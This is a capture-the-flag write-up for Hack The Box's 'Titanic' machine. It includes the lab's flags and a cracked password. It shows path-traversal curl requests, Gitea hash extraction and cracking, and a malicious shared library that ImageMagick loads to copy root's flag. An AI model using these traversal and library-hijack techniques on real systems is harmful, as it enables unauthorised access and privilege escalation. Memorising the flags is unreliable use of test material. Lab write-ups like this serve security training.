[Titanic](https://app.hackthebox.com/machines/Titanic) is an Easy machine released on 15th February 2025 on Hack The Box.

User Flag: `3ad0f6ac29b0bd200f26357b50c60fd9`

Root Flag: `9fac61210e9fc964e61fd42f547290a9`

## Write-up

Starting off with a classic scan of the target for open ports.

Add the host to `/etc/hosts` for ease of access.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954904/image_bs7xzc.png)

From the scan we can see that port 80 is open, which means there is a web server of some sort. So the first thing we need to do is have a look and see what we are dealing with.

It's a cruise booking site. Let's try and book a ticket with Burp up to capture the traffic.

You can see that it looks for a file directly which we can hopefully exploit and ask it to read a file for us.

Notice that this one has a directory and a logon. This is a big clue that says, "look here". Let's send the exploit request to the repeater and have a look.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954937/image_bgz9p1.png)

Okay so we've done everything we can on here - now we need to look for the root flag. We can check `/etc/hosts` as the first host was not obvious, perhaps there is another site we can explore.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954940/image_rki3kz.png)

Great, so we have a dev environment `dev.titanic.htb`. Perfect, let's add it to our hosts and have a look.

`sudo nano /etc/hosts`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954943/image_rs6p0w.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954946/image_rh0aex.png)

When you press the explore button you go straight to the GitHub repository that contains config files. We can then have a look around and see if we can get any useful information.

`http://dev.titanic.htb/explore/repos`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954949/image_tbnncm.png)

And that's a database password - because they haven't used environment variables, so the password is just right there in the repository for us to find. This port was not open on our scan though, so I guess we don't log in that way. It is, however, worth making a note of the credentials anyway.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954951/image_x1czjc.png)

`curl --path-as-is 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954954/image_kqpv00.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954957/image_ovvqth.png)

We can see from the output that the database has a path. Let's go back to Burp and see if we can read the database file in the path that we found - `/data/gitea/gitea.db` .

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954961/image_inkmts.png)

`curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db`

`" -o gitea.db`

Save the database locally with the above command so that we can use the snoop around in the `.db` file.

`sqlite3 gitea.db`

`sqlite> .tables`

`sqlite> SELECT lower_name, passwd, salt FROM user;`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954964/image_yy56qt.png)

Great, so we have some hashes. Let's get cracking.

`hashcat -m 10900 gitea_hash.txt /usr/share/wordlists/rockyou.txt`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954967/image_eirgri.png)

Ok so from the initial attempt we can see that it's a non-standard hash type. After some digging around online, I figured that it's a `gitea`hash. That should have been obvious because that's what the database is called but we live and we learn.

You must run the script below on the hashes file which will convert the hashes to the correct format and then they can be cracked.

`https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271`

`hashcat -S -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt`

I was surprised at how long this took.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954971/image_j0j6ut.png)

However, it turns out the `developer` hash has already been cracked but I had not seen that in the output, but you can use `--show` to display cracked hashes! And then we can go ahead and login to the target with SSH.

`25282528`

`ssh developer@titanic.htb`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954975/image_tybcj1.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954978/image_c1x4xd.png)

Above is an alternative method to get the user flag. Now let's check for write and execute permissions with this user.

`find /opt -writable -type d 2>/dev/null`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954981/image_fcwka5.png)

`find / -type f -perm -u=x 2>/dev/null`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954984/image_gjx3l5.png)

There's a .sh file which is interesting - we may be able to run something here and escalate our privs.

`cd /opt/scripts/`

`cat identify_images.sh`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750954993/image_gotefb.png)

Ok so the script is not that interesting except for the fact that it is pointing out a binary for us `magick`. Let's check the version and see if it's vulnerable to anything.

`/usr/bin/magick --version`

After some browsing it turns out that this version is vulnerable so we can go ahead and give this a go with the exploit below.

`https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8`

Ok so we can write to **`/opt/app/static/assets/images/` so I guess that's where we put the exploit code - we basically trick the software into thinking that our file is a share library, but it has some code that will give us the root flag.

`cd /opt/app/static/assets/images`

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /root/root.txt root.txt; chmod 754 root.txt");
    exit(0);
}
EOF
```

Put the above script in `/opt/app/static/assets/images/` which is the vulnerable path. I think it's supposed to be an `.so` file. ImageMagick will process the file and then execute the command which will copy `root.txt`to the directory we are in.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1750955009/image_v58roy.png)

This should then run and copy over the root.txt file to our directory. Note: this can take up to a minute or so.

`cat root.txt`

## Thoughts

One of the more interesting boxes in the Easy category. It has a nice mix of attack vectors which is great, but possibly a tad difficult for its rating. I got stuck for quite a while on the hash part because it had been a while since I had needed to convert hashes before cracking them and I was having a lot of issues with the script. Other than that, it was good, and it had a nice linear path which meant that the number of rabbit holes you can go down is limited.

Overall, a solid challenge. I would give it a firm 6/10 - it's ok.
